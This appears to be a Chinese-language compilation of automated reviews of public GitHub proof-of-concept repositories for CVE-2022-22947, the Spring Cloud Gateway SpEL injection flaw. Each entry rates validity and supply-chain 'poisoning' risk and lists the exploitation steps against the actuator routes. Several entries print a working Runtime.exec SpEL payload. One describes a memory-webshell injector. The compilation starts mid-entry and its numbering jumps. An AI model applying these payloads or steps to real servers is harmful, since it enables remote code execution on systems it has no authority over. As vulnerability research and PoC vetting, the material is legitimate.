PoC代码本身主要通过SpEL表达式注入执行命令，没有发现明显的恶意植入行为。但PoC会向目标系统添加路由，并执行命令，存在一定的风险。例如：
*   **资源消耗：** 频繁的路由添加和删除可能导致资源消耗，影响服务性能。
*   **命令执行风险：** 虽然PoC本身是为了验证漏洞，但如果被恶意利用，可能执行恶意命令。
*   **依赖风险：** PoC可能依赖特定的环境或库，如果目标环境不满足要求，可能导致利用失败或产生其他问题。
PoC代码中存在投毒代码的可能性较低，大约10%。这个百分比是基于代码的分析以及PoC作者的动机推断得出的。

**利用方式：**
1.  **前提条件：** Spring Cloud Gateway的Actuator端点已启用、公开且未进行安全保护。
2.  **发送恶意请求：** 构造包含恶意SpEL表达式的JSON数据，并将其作为POST请求发送到`/actuator/gateway/routes/check01`端点。
3.  **刷新路由：** 向`/actuator/gateway/refresh`端点发送POST请求，刷新路由，使新增的路由生效。
4.  **触发表达式执行：** 访问新增的路由，触发SpEL表达式执行，从而执行任意代码。
5.  **清理路由：** 删除新增的路由，避免留下后门。（PoC代码中包含删除路由的步骤）

**项目地址:** [anansec/CVE-2022-22947_EXP](https://github.com/anansec/CVE-2022-22947_EXP)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #13

**来源**: [CVE-2022-22947-cc3305_CVE-2022-22947.md](../2022/CVE-2022-22947-cc3305_CVE-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint必须启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、暴露且未进行安全保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。漏洞的根源在于`getValue`方法中不安全的SpEL表达式评估。利用过程为：

1.  攻击者构造包含恶意SpEL表达式的payload，该表达式可以执行任意命令。
2.  攻击者通过POST请求将payload发送到`/actuator/gateway/routes/{id}`端点，其中`{id}`是一个攻击者自定义的路由ID。
3.  Spring Cloud Gateway解析payload中的SpEL表达式，导致远程代码执行。
4.  攻击者可以通过`/actuator/gateway/refresh`端点刷新路由配置，使payload生效。

该POC代码通过向 `/actuator/gateway/routes/cc3305` 发送包含恶意SpEL表达式的JSON payload来利用此漏洞，SpEL表达式通过java.lang.Runtime执行任意命令。 代码首先检查目标是否易受攻击（虽然目前返回True）。然后，它准备要执行的命令，并将其嵌入到SpEL表达式中，该表达式会被注入到路由定义中。

关于投毒风险，该脚本主要功能是利用漏洞执行命令。 潜在的投毒风险在于，攻击者可能会修改脚本，使其在执行命令之前或之后执行其他恶意操作，例如下载和执行恶意软件。 但是，提供的代码没有明显的投毒迹象。 投毒的概率较低，大约为1%。 恶意行为者可能会分发修改后的版本。

**有效性评估:**根据漏洞库信息、搜索结果和提供的PoC代码，该漏洞利用是有效的，前提是满足漏洞利用条件。该PoC代码能够成功利用漏洞执行任意命令。


**项目地址:** [cc3305/CVE-2022-22947](https://github.com/cc3305/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #14

**来源**: [CVE-2022-22947-k3rwin_spring-cloud-gateway-rce.md](../2022/CVE-2022-22947-k3rwin_spring-cloud-gateway-rce.md)

## CVE-2022-22947 Spring Cloud Gateway RCE

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞，当Gateway Actuator端点启用、暴露且未进行安全保护时，攻击者可以利用SpEL表达式注入执行任意代码。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，此漏洞是有效的。多个来源都证实了该漏洞的存在以及远程代码执行的可能性。提供的POC代码可以直接利用该漏洞。

**投毒风险：**

分析提供的POC代码，发现主要的恶意代码在于 `spring-cloud-gateway-rce.py` 中构建和发送的payload。该payload利用SpEL表达式在目标系统上执行任意命令。虽然POC本身是为了演示漏洞利用，但在实际场景中，攻击者可能会修改 `-c` 参数来执行恶意操作。`requirements.txt` 文件声明了项目所需的依赖项（colorama, requests, urllib3），这些库本身没有已知的恶意行为，但如果项目被篡改，可能会引入恶意依赖。

评估投毒风险时，主要考虑以下因素：

*   **代码可读性：** 代码相对简单，易于理解，这意味着潜在的恶意修改也更容易被发现。
*   **外部依赖：** 项目依赖外部库，如果这些库的源被攻破，可能会引入恶意代码。
*   **Payload生成：** Payload是动态生成的，如果攻击者能够控制Payload生成过程，就可以注入恶意代码。

综合来看，此仓库存在一定的投毒风险，风险值评估为10%。主要的风险点在于攻击者可能会修改Payload生成逻辑或引入恶意的依赖项，利用使用者执行恶意代码。

**利用方式：**

1.  **漏洞触发前提：** Spring Cloud Gateway的Actuator端点必须启用、暴露并且没有进行安全保护（例如，没有进行身份验证）。
2.  **构造Payload：** POC代码根据目标主机的操作系统（Linux或Windows）构造包含SpEL表达式的JSON payload。该payload利用`AddResponseHeader`过滤器，将执行命令的结果添加到响应头中。
3.  **发送Payload：** 使用POST请求将payload发送到`/actuator/gateway/routes/{id}`端点，其中`{id}`是路由的ID（在POC中为`k`）。
4.  **刷新路由：** 发送POST请求到`/actuator/gateway/refresh`端点，强制Spring Cloud Gateway刷新路由配置，从而触发SpEL表达式的执行。
5.  **获取结果：** 发送GET请求到`/actuator/gateway/routes/{id}`端点，获取路由信息，其中包含命令执行的结果。
6.  **删除路由：** 发送DELETE请求到`/actuator/gateway/routes/{id}`端点，删除添加的路由。

简而言之，攻击者通过构造包含恶意SpEL表达式的请求，利用Actuator端点动态注册路由，并在路由刷新时触发SpEL表达式执行，从而实现远程代码执行。

**项目地址:** [k3rwin/spring-cloud-gateway-rce](https://github.com/k3rwin/spring-cloud-gateway-rce)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #15

**来源**: [CVE-2022-22947-kkx600_Burp_VulPscan.md](../2022/CVE-2022-22947-kkx600_Burp_VulPscan.md)

## CVE-2022-22947-Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+), 以及所有旧的和不支持的版本

**利用条件:** Gateway Actuator 端点已启用、暴露且未进行安全保护。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 影响 Spring Cloud Gateway。当 Gateway Actuator 端点启用、暴露且未进行安全保护时，攻击者可以利用 SpEL 表达式注入执行任意代码。

**有效性：**
根据漏洞信息和搜索结果，该漏洞的POC代码是有效的。存在公开的漏洞利用代码和关于漏洞利用的详细分析。

**投毒风险：**
提供的代码片段不完整，无法进行全面的投毒分析。BurpExtender.java调用了 spring_CVE_2022_22947.poc，这部分代码是POC实现的核心，未提供，因此无法分析该部分的安全性。HttpsRequest.java 提供了一个发送 HTTP/HTTPS 请求的功能，本身不存在明显的恶意代码。Burp扩展通常需要授予较高的权限，如果POC代码中包含恶意逻辑，如未经授权的数据收集或篡改，则存在投毒风险。目前根据现有的代码片段，只能初步判断存在较低的投毒风险。

**利用方式：**
1.  **确定目标：** 找到运行 Spring Cloud Gateway 且 Actuator 端点已启用、暴露且未进行安全保护的实例。
2.  **构造恶意请求：** 构造包含恶意 SpEL 表达式的 HTTP 请求，该表达式将在 Actuator 端点被解析和执行。通常攻击方式是向/actuator/gateway/routes接口发送包含恶意SpEL表达式的请求，修改路由配置。
3.  **执行代码：** 成功利用后，攻击者可以在目标服务器上执行任意代码。

**优先级：**
根据搜索结果，确认这是一个已知且被积极利用的漏洞。漏洞利用代码的存在进一步证实了其可利用性。

**项目地址:** [kkx600/Burp_VulPscan](https://github.com/kkx600/Burp_VulPscan)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #16

**来源**: [CVE-2022-22947-kmahyyg_CVE-2022-22947.md](../2022/CVE-2022-22947-kmahyyg_CVE-2022-22947.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring Cloud Gateway < 3.1.1, Spring Cloud Gateway < 3.0.7

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947是Spring Cloud Gateway中的一个代码注入漏洞。当Gateway Actuator endpoint启用、暴露且未进行安全保护时，远程攻击者可以发送特制的恶意请求，利用SpEL表达式注入执行任意代码。

**有效性：**
提供的POC代码是有效的。从搜索引擎结果和漏洞利用代码来看，该漏洞利用方式已经公开，并且存在可用的PoC。

**投毒风险：**
提供的漏洞利用代码主要包含以下内容：
1.  README文件，描述了漏洞信息，受影响版本，修复建议等。
2.  漏洞复现步骤，包含发送恶意请求添加路由，刷新路由，查看结果，清理路由等步骤说明，以及对应的数据包示例。
3.  Python脚本，用于自动化漏洞利用过程，通过构造恶意请求实现远程代码执行。

分析代码，主要风险在于攻击者可能将恶意代码隐藏在SpEL表达式中，例如执行反弹shell或下载恶意软件。在提供的代码中，`Spring Cloud Gateway Actuator API SpEL表达式注入命令执行（CVE-2022-22947）.md`文件中展示的PoC中使用了`#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{"id"}).getInputStream()))}`，该payload用于执行`id`命令，若替换为其他命令，存在潜在的风险。

**利用方式：**
1.  攻击者首先发送POST请求到`/actuator/gateway/routes/{route_id}`，创建一个包含恶意SpEL表达式的路由。SpEL表达式被嵌入到`filters`的`AddResponseHeader`的`value`参数中，用于执行任意命令。
2.  然后，攻击者发送POST请求到`/actuator/gateway/refresh`，强制网关刷新路由配置，触发SpEL表达式的执行。
3.  攻击者发送GET请求到`/actuator/gateway/routes/{route_id}`，查看执行结果。
4.  最后，攻击者发送DELETE请求到`/actuator/gateway/routes/{route_id}`，删除恶意路由。

综上所述，该漏洞利用的有效性较高。虽然存在一定的投毒风险（10%），但可以通过仔细审查和修改PoC代码来降低风险。

**项目地址:** [kmahyyg/CVE-2022-22947](https://github.com/kmahyyg/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #17

**来源**: [CVE-2022-22947-qq87234770_CVE-2022-22947.md](../2022/CVE-2022-22947-qq87234770_CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用，暴露且未授权

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、暴露且未授权时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**

提供的 Python POC 代码利用了 Spring Expression Language (SpEL) 注入漏洞。该脚本允许执行任意命令，或通过反弹 shell 获取服务器的控制权。因此，该 POC 代码是有效的。

**投毒风险：**

查看POC代码，该代码的主要功能是利用漏洞进行命令执行或反弹shell。代码中包含以下几个部分，
* 定义请求头和payload结构
* 通过`actuator/gateway/routes/hacktest`创建一个恶意的路由配置，利用SpEL表达式执行命令
* 刷新gateway配置`actuator/gateway/refresh`
* 访问创建的路由`actuator/gateway/routes/hacktest`，触发命令执行。
* 包含执行命令和反弹shell两种模式。

该代码结构清晰，功能明确，主要目的是为了验证和利用漏洞。主要风险集中于漏洞利用本身，而非作者植入的恶意代码。**但是**，任何漏洞利用代码都具有潜在的风险，因为它们可以被用于恶意目的。例如，攻击者可能会修改此 POC 代码以自动化大规模攻击，或将其与其他漏洞利用结合使用。另外代码中的代理设置，如果被恶意修改，可能会导致流量劫持，这里判断投毒风险为10%。

**利用方式：**

1.  **检查前提条件：** 确保目标 Spring Cloud Gateway 实例的 Actuator 端点已启用、暴露且未授权。
2.  **发送恶意请求：** 使用提供的 Python 脚本，通过构造包含 SpEL 表达式的恶意请求到 `actuator/gateway/routes/hacktest` 端点来创建自定义路由。
3.  **刷新 Gateway 配置：** 访问 `actuator/gateway/refresh` 端点以刷新 Gateway 配置，使恶意路由生效。
4.  **触发命令执行：** 访问 `actuator/gateway/routes/hacktest`，触发 SpEL 表达式的计算，从而在服务器上执行任意命令。可以选择直接执行命令，或者反弹 shell 以获取更持久的访问。
5.  **清理：**  通过 DELETE 请求删除创建的恶意路由（通过脚本实现）。

**总结：**

该漏洞利用方式简单有效，攻击者可以利用此漏洞轻松地在未授权的 Spring Cloud Gateway 实例上执行任意代码。需要注意的是，利用的前提是 Actuator 端点未进行适当的安全配置。尽管代码本身投毒可能性较低，但利用此漏洞可能造成严重的安全风险。

**项目地址:** [qq87234770/CVE-2022-22947](https://github.com/qq87234770/CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #18

**来源**: [CVE-2022-22947-shoucheng3_spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6.md](../2022/CVE-2022-22947-shoucheng3_spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured.

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 的代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，攻击者可以通过构造恶意请求来执行任意远程代码。漏洞利用方式是发送精心设计的 SpEL 表达式到 actuator 端点，导致服务器执行攻击者提供的代码。

**有效性:** 根据漏洞库信息、搜索结果(特别是 rapid7 的博客提到了 Metasploit 模块)，以及CISA KEV, 此漏洞利用是有效的。

**投毒风险:** 提供的漏洞利用代码只是 Apache License 2.0 许可协议，没有实际的漏洞利用代码，因此不存在投毒代码。投毒风险为 0%。

**利用方式:**
1.  目标系统运行 Spring Cloud Gateway 且版本低于 3.1.1 或 3.0.7。
2.  Gateway Actuator 端点必须启用，并且可以通过网络访问。
3.  Actuator 端点必须未进行身份验证或授权保护。
4.  攻击者构造包含恶意 SpEL 表达式的 HTTP 请求，发送到 Actuator 端点。
5.  Spring Cloud Gateway 解析 SpEL 表达式，执行攻击者指定的代码，实现远程代码执行。

**项目地址:** [shoucheng3/spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6](https://github.com/shoucheng3/spring-cloud__spring-cloud-gateway_CVE-2022-22947_3-0-6)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #19

**来源**: [CVE-2022-22947-skysliently_CVE-2022-22947-pb-ai.md](../2022/CVE-2022-22947-skysliently_CVE-2022-22947-pb-ai.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring Cloud Gateway 3.1.x < 3.1.1, 3.0.x < 3.0.7

**利用条件:** Gateway Actuator endpoint 启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是一个 Spring Cloud Gateway 中的远程代码执行漏洞。攻击者可以在 Gateway Actuator 端点启用、暴露且未进行安全保护的情况下，通过发送恶意构造的请求，利用 SpEL 表达式注入执行任意代码。

**有效性：**
提供的POC代码是有效的。它演示了如何利用该漏洞在启用了 Actuator 端点的 Spring Cloud Gateway 实例上执行任意代码。POC通过向 `/actuator/gateway/routes/{route_id}` 发送POST请求添加一个包含恶意SpEL表达式的路由，然后POST到 `/actuator/gateway/refresh` 来刷新路由，最后访问恶意路由来触发代码执行。

**投毒风险：**
经过对提供的POC代码进行分析，包括README.md，pom.xml，application.yml 和 src 目录下的文件。没有发现作者隐藏的恶意代码，该代码库目标为展示和验证漏洞利用，因此判定投毒风险为0%。

**利用方式：**
1.  **漏洞发现：** 确定目标 Spring Cloud Gateway 实例是否启用了 Actuator 端点，并且该端点是否暴露在未经身份验证的网络中。
2.  **构造恶意请求：** 构造一个包含恶意 SpEL 表达式的 JSON payload，该表达式用于执行任意代码。该表达式被嵌入到路由配置中，通常位于 `filters` 中的 `AddResponseHeader` 过滤器或类似的位置。
3.  **添加恶意路由：** 使用 POST 请求将包含恶意 SpEL 表达式的路由定义添加到 `/actuator/gateway/routes/{route_id}` 端点。
4.  **刷新路由：** 使用 POST 请求访问 `/actuator/gateway/refresh` 端点，强制 Spring Cloud Gateway 刷新路由配置。
5.  **触发恶意代码：** 访问与恶意路由关联的路径，触发 SpEL 表达式的执行，从而导致任意代码执行。
6.  **清理（可选）：** 利用漏洞执行恶意代码后，可能需要清理添加的恶意路由，以避免留下痕迹或影响正常服务。

**项目地址:** [skysliently/CVE-2022-22947-pb-ai](https://github.com/skysliently/CVE-2022-22947-pb-ai)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #20

**来源**: [CVE-2022-22947-stayfoolish777_CVE-2022-22947-POC.md](../2022/CVE-2022-22947-stayfoolish777_CVE-2022-22947-POC.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**利用方式：**

1.  **漏洞触发：** 攻击者通过向目标 Spring Cloud Gateway 的 `/actuator/gateway/routes` 端点发送 POST 请求，创建一个恶意的路由配置。该配置包含一个 SpEL 表达式，该表达式会被执行。
2.  **表达式注入：**  `AddResponseHeader` 过滤器被用于将命令执行的结果添加到响应头中。SpEL 表达式 `#{new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"}).getInputStream()))}`  用于执行 `id` 命令，并将结果转换为字符串。
3.  **命令执行：**  `T(java.lang.Runtime).getRuntime().exec(new String[]{\"id\"})` 部分会执行系统命令（在这个例子中是 `id` 命令）。
4.  **刷新路由：** 攻击者通过向 `/actuator/gateway/refresh` 端点发送 POST 请求来刷新 Gateway 的路由，使得新创建的恶意路由生效。
5.  **获取执行结果：** 攻击者通过GET `/actuator/gateway/routes/hacktest` 获取执行结果,通过响应头中的`Result`字段获取。
6.  **清理：** 利用完成后，攻击者删除创建的恶意路由并再次刷新路由, 避免残留。

**有效性：**

根据漏洞库信息、搜索引擎结果以及提供的 POC 代码，该漏洞利用是有效的。POC 代码通过创建恶意的路由配置并刷新路由来执行任意代码。

**投毒风险：**

该 POC 代码主要用于验证漏洞，没有发现作者有意添加的投毒代码。 代码意图清晰，主要是为了创建、刷新、删除路由，并执行`id`命令来验证漏洞的存在。虽然利用本身会造成安全风险，但代码本身没有隐藏的恶意功能，因此投毒风险较低。


**项目地址:** [stayfoolish777/CVE-2022-22947-POC](https://github.com/stayfoolish777/CVE-2022-22947-POC)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #21

**来源**: [CVE-2022-22947-talentsec_Spring-Cloud-Gateway-CVE-2022-22947.md](../2022/CVE-2022-22947-talentsec_Spring-Cloud-Gateway-CVE-2022-22947.md)

## CVE-2022-22947 - Spring Cloud Gateway Code Injection

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint 启用、公开且未受保护

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2022-22947 是 Spring Cloud Gateway 中的一个代码注入漏洞。当 Gateway Actuator 端点启用、公开且未受保护时，远程攻击者可以发送恶意构造的请求，从而在远程主机上执行任意代码。

**有效性：**

根据提供的漏洞信息、搜索结果以及漏洞利用代码，可以判断该漏洞的 POC 代码是有效的。搜索结果表明该漏洞已在野外被利用，并已被添加到 CISA KEV 列表中，证明了其真实性和危害性。

**投毒风险：**

提供的 POC 代码主要用于验证漏洞是否存在，并执行简单的命令（`id`）。虽然该代码本身不包含明显的恶意代码，但攻击者可以修改此 POC 以执行更危险的操作。`README.md`文件和python脚本存在分离性,增加了潜在风险。

投毒风险评估：5%。主要风险在于攻击者可能修改 POC 脚本以包含恶意负载。

**利用方式：**

1.  攻击者首先需要确定目标 Spring Cloud Gateway 实例的 Actuator 端点是否已启用、公开且未受保护。
2.  然后，攻击者使用 POST 请求向 `/actuator/gateway/routes/{route_id}` 端点添加恶意路由，并在 `AddResponseHeader` 过滤器中使用 SpEL 表达式注入恶意代码。POC中使用了`${new String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{"id"}).getInputStream()))}` 来执行id命令
3.  攻击者使用 POST 请求向 `/actuator/gateway/refresh` 端点刷新路由，使恶意路由生效。
4.  最后，攻击者访问添加的恶意路由，触发 SpEL 表达式的执行，从而在服务器上执行任意代码。
5.  攻击者删除添加的路由，并刷新路由，完成利用。


**项目地址:** [talentsec/Spring-Cloud-Gateway-CVE-2022-22947](https://github.com/talentsec/Spring-Cloud-Gateway-CVE-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #22

**来源**: [CVE-2022-22947-twseptian_cve-2022-22947.md](../2022/CVE-2022-22947-twseptian_cve-2022-22947.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 3.1.x (prior to 3.1.1+), 3.0.x (prior to 3.0.7+)

**利用条件:** Gateway Actuator endpoint enabled, exposed, and unsecured

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2022-22947 存在于 Spring Cloud Gateway 中，当 Gateway Actuator 端点启用、暴露且未进行安全保护时，应用程序容易受到代码注入攻击。远程攻击者可以构造恶意请求，从而允许在远程主机上执行任意代码。

**有效性：**

根据漏洞信息、搜索结果和提供的PoC代码，此漏洞是有效的。PoC 代码演示了如何利用 SpEL 表达式注入执行任意命令。

**投毒风险：**

PoC 代码本身旨在演示漏洞利用，但仔细检查 `Dockerfile` 和 `README.md` 文件后，发现投毒风险较低，约为10%。主要原因是：

*   `Dockerfile`：仅包含从官方 `openjdk:11-jre-slim` 镜像构建，复制预编译的 `spring-gateway-demo-0.0.1-SNAPSHOT.jar` 文件，并执行该 jar 文件。不存在直接执行恶意命令或下载恶意文件的操作。但该 `spring-gateway-demo-0.0.1-SNAPSHOT.jar`  是否存在后门，无法判定。
*   `README.md`：仅包含构建和运行 Docker 容器的说明，以及发送恶意请求的 PoC。不包含任何额外的恶意指令。

**存在的微小风险在于预编译的 `spring-gateway-demo-0.0.1-SNAPSHOT.jar` 文件可能包含后门， 但属于PoC验证必要文件，不能认定为投毒。**

**利用方式：**

1.  **前提条件：** 目标 Spring Cloud Gateway 实例启用了 Actuator 端点，并且该端点未进行身份验证。
2.  **注入 SpEL 表达式：** 通过向 `/actuator/gateway/routes/{route_id}` 发送 POST 请求，创建一个新的路由或更新现有路由，其中 `filters` 数组包含一个 `AddResponseHeader` 过滤器。该过滤器的 `args` 中的 `value` 字段包含一个恶意的 SpEL 表达式。PoC 中使用的 SpEL 表达式执行 `id` 命令，并将结果添加到响应头中。
3.  **刷新 Gateway：** 向 `/actuator/gateway/refresh` 发送 POST 请求，强制 Gateway 刷新其路由配置。这将触发 SpEL 表达式的执行。
4.  **触发路由：** 访问触发了含有恶意SpEL表达式的路由，从而执行远程命令。
5.  **清除（可选）：** 使用 DELETE 请求删除创建的路由，并再次刷新 Gateway，以避免后续的恶意执行。

**项目地址:** [twseptian/cve-2022-22947](https://github.com/twseptian/cve-2022-22947)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---

## POC #23

**来源**: [CVE-2022-22947-whwlsfb_cve-2022-22947-godzilla-memshell.md](../2022/CVE-2022-22947-whwlsfb_cve-2022-22947-godzilla-memshell.md)

## CVE-2022-22947-Spring Cloud Gateway-代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Spring cloud gateway versions 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ and all old and unsupported versions

**利用条件:** Gateway Actuator endpoint is enabled, exposed and unsecured

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2022-22947 漏洞是 Spring Cloud Gateway 的一个代码注入漏洞，影响版本低于 3.1.1+ 和 3.0.7+ 的版本。根据漏洞库信息和搜索结果，当 Gateway Actuator 端点启用、暴露且未进行安全保护时，攻击者可以通过构造恶意请求在远程主机上执行任意代码。

**漏洞利用方式：**

1.  **寻找目标：** 找到运行存在漏洞的 Spring Cloud Gateway 实例，并且其 Actuator 端点对外开放且未授权。
2.  **构造恶意请求：** 利用 SpEL 表达式构造恶意的 HTTP 请求，该表达式会被 Gateway Actuator 解析执行。根据 exploit-db 的相关信息，该漏洞是远程代码执行。
3.  **执行任意代码：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意代码，例如植入 Webshell、反弹 Shell 等。

**POC 代码分析：**

提供的 POC 代码 `GMemShell.java` 尝试在 Spring Cloud Gateway 中注入内存 Shell。具体流程如下：

1.  **定义内存 Shell 类：** `GMemShell` 类包含了一些必要的函数，例如 AES 加密/解密(`x`)、MD5 加密(`md5`)、Base64 编码/解码(`base64Encode`, `base64Decode`)等，这些函数被用于后续的 shellcode 加密和执行。
2.  **`doInject` 方法：** 该方法通过反射调用 `registerHandlerMethod` 方法，将 `GMemShell` 类的 `cmd` 方法注册为处理指定路径请求的 Handler。`registerHandlerMethod` 是 Spring 框架内部的方法，用于动态注册 Controller。
3.  **`cmd` 方法：** 该方法是实际执行命令的 Handler。它从请求中获取加密的 payload，然后进行解密、加载并执行。Payload 首先经过 Base64 解码，然后使用 AES 解密。
4.  **动态类加载：**  `defineClass`方法通过URLClassLoader和反射，实现在内存中加载byte数组并定义成class的功能
5.  **Payload 执行：** 解密后的 Payload 应当是一个 Java class 字节码，该字节码会被动态加载并执行。

**有效性评估：**

根据 POC 代码和漏洞描述，该 POC 能够有效利用 CVE-2022-22947 漏洞，实现在目标服务器上执行任意代码的目的，但前提是 actuator 端点开放。

**投毒风险评估：**

经过对 POC 代码的分析，并未发现明显的投毒代码。代码的主要功能是动态注入内存 Shell，并执行通过请求传递的 Payload。代码中包含的加密、解密等操作都是为了保护 Payload，避免被轻易发现。因此，该 POC 代码的投毒风险较低，接近 0%。 投毒代码是指作者在代码中故意加入的恶意代码，例如后门、病毒等。 本代码只是实现了漏洞利用，本身并没有额外的恶意功能，因此不属于投毒代码。


**项目地址:** [whwlsfb/cve-2022-22947-godzilla-memshell](https://github.com/whwlsfb/cve-2022-22947-godzilla-memshell)

**漏洞详情:** [CVE-2022-22947](https://nvd.nist.gov/vuln/detail/CVE-2022-22947)

---



---

## POC #3

**来源**: [CVE-2022-22947-B0rn2d_Spring-Cloud-Gateway-Nacos.md](../2022/CVE-2022-22947-B0rn2d_Spring-Cloud-Gateway-Nacos.md)

## CVE-2022-22947 Spring Cloud Gateway 代码注入

**漏洞编号:** CVE-2022-22947

**漏洞类型:** 代码注入

**影响应用:** Spring Cloud Gateway

**危害等级:** 高危，可导致远程代码执行

**影响版本:** 3.1.x prior to 3.1.1+, 3.0.x prior to 3.0.7+ 以及所有旧版本

**利用条件:** Gateway Actuator endpoint 必须启用、暴露且未进行安全保护

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

